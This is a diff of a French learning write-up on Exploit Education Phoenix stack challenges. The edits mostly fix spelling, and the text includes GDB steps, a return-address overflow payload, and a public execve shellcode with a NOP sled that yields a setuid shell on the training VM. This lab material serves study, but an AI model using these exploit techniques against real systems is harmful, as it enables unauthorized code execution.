@@ -21,7 +21,7 @@ Ces compétences sont essentielles pour le reverse engineering et la recherche d
 
 ## Environnement de travail
 
-Après avoir téléchargé et installé la VM Phoenix (architecture AMD64), lancer : `./boot-exploit-education-phoenix-amd64.sh`. Se connecter : `ssh user@0.0.0.0 -p 2222` .
+Après avoir téléchargé et installé la VM Phoenix (architecture AMD64), lancer : `./boot-exploit-education-phoenix-amd64.sh`. Se connecter : `ssh user@0.0.0.0 -p 2222`.
 
 Le répertoire de travail `/opt/phoenix/amd64/` contient plusieurs catégories d'exercices :
 
@@ -172,7 +172,7 @@ Pour réussir, je dois :
 
 ### Analyse avec GDB
 
-La VM Phoenix a l'**ASLR désactivé**, ce qui signifie que les adresses sont fixes. L'ASLR (Address Space Layout Randomization) est une protection introduite en 2005 sur Linux qui randomise les adresses mémoire.
+La VM Phoenix a l'**ASLR désactivée**, ce qui signifie que les adresses sont fixes. L'ASLR (Address Space Layout Randomization) est une protection introduite en 2005 sur Linux qui randomise les adresses mémoire.
 
 ```bash
 gdb ./stack-three
@@ -219,14 +219,14 @@ Représentation de la mémoire :
 ![](/images/phoenix/stack-four.png)
 ### Analyse avec GDB
 
-On récupère l'adresse de comple_level()
+On récupère l'adresse de complete_level()
 ```bash
 (gdb) print complete_level
 $1 = {<text variable, no debug info>} 0x40061d <complete_level>
 ``` 
 ### Exploitation
-Il faut donc faire un overflow pour écraser la valeur intiale de l'adresse de retour.
-Avec la représentation de la stack, nous pouvons remarquer qu'il faut écire de `rbp - 0x50` jusqu'à `rbp + 0x8` et écrire l'adresse.
+Il faut donc faire un overflow pour écraser la valeur initiale de l'adresse de retour.
+Avec la représentation de la stack, nous pouvons remarquer qu'il faut écrire de `rbp - 0x50` jusqu'à `rbp + 0x8` et écrire l'adresse.
 Il faut donc écrire 0x58 puis l'adresse.
 
 Solution : 
@@ -239,10 +239,10 @@ Solution :
 
 ### Objectif du challenge
 
-Éxécuter un shell à travers le programme.
+Exécuter un shell à travers le programme.
 
 ### Démarche
-#### Détournement adresse retour fonction:
+#### Détournement de l'adresse de retour d'une fonction :
 Une des solutions serait de modifier l'adresse de retour d'une des fonctions pour faire pointer sur notre shellcode.
 Voici la stack mémoire pour la fonction start_level():
 ![](/images/phoenix/stack-five.png)
@@ -253,16 +253,16 @@ python2 -c 'print(0x88 * b"a" + b"ADDRESSE")' | ./stack-five
 ```
 
 #### Variable d'environnement:
-Nous allons stocker le shellcode dans une variables d'environnement.
-La variable d'environnement conteindra beaucoup d'instruction NOP pour aller directement au shellcode.
-L'utilisatio nd'instruction NOP permet d'atérir sur notre shellcode même si l'adresse mémoire de la var d'env varie.
+Nous allons stocker le shellcode dans une variable d'environnement.
+La variable d'environnement contiendra beaucoup d'instructions NOP pour atteindre directement le shellcode.
+L'utilisation d'instructions NOP permet d'atterrir sur notre shellcode même si l'adresse mémoire de la variable d'environnement varie.
 
-En hexa l'instruction NOP est `\x90`.
+En hexadécimal, l'instruction NOP est `\x90`.
 [Documentation instruction NOP](https://www.gladir.com/LEXIQUE/ASM/nop.htm)
 
 On récupère un shellcode en ligne : 
 
-`\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05` est un shellcode (suite d'opration assembleur ouvrant un shell). [shellcode utilisé](https://shell-storm.org/shellcode/files/shellcode-806.html)
+`\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05` est un shellcode (suite d'opérations en assembleur ouvrant un shell). [shellcode utilisé](https://shell-storm.org/shellcode/files/shellcode-806.html)
 
 On initialise notre variable : 
 ```shell
@@ -272,17 +272,17 @@ export SHELLCODE=$(python2 -c 'print(10000 * b"\x90" + b"\x31\xc0\x48\xbb\xd1\x9
 On récupère l'adresse de la variable : 
 ```shell
 gdb ./stack-five
-b main #breakpoint au début de main
-r #run le program
-print (void *)getenv("SHELLCODE") #affiche adresse de la var
+b main # breakpoint au début de main
+r # run le programme
+print (void *)getenv("SHELLCODE") # affiche l'adresse de la variable
 (gdb) print (void *)getenv("SHELLCODE")
 $1 = (void *) 0x7fffffffc780
 ```
 
 #### Exploit
-On à ajouter 10000 instruction NOP avant notre shellcode pour avoir plus de chance de tomber sur la bonne adresse dû au décalage en mémoire.
+On a ajouté 10 000 instructions NOP avant notre shellcode pour avoir plus de chances de tomber sur la bonne adresse à cause du décalage en mémoire.
 
-On ajoute 10000/2 à notre adresses : 
+On ajoute 5 000 à notre adresse :
 ```python
 >>> hex(0x7fffffffc780 + 5000)
 '0x7fffffffdb08'
@@ -294,16 +294,16 @@ On ajoute 10000/2 à notre adresses :
 whoami 
 phoenix-amd64-stack-five
 ```
-Nous avons maintenant les droit suid (élévation de privilège)
+Nous avons maintenant les droits setuid (élévation de privilèges)
 
 
 ## Conclusion et perspectives
 
 Ce travail sur Phoenix m'a permis de :
-- **Comprendre en profondeur** la gestion de la mémoire en architecture ARM64
+- **Comprendre en profondeur** la gestion de la mémoire en architecture AMD64
 - **Maîtriser GDB** pour l'analyse de binaires et le débogage
 - **Développer une méthodologie** d'identification et d'exploitation de vulnérabilités
 - **Renforcer mes compétences** en reverse engineering
 
-Les exercices suivants (stack-five, stack-six, format strings, heap exploitation) sont actuellement en cour de rédaction.
+Les exercices suivants (stack-five, stack-six, format strings, heap exploitation) sont actuellement en cours de rédaction.
 
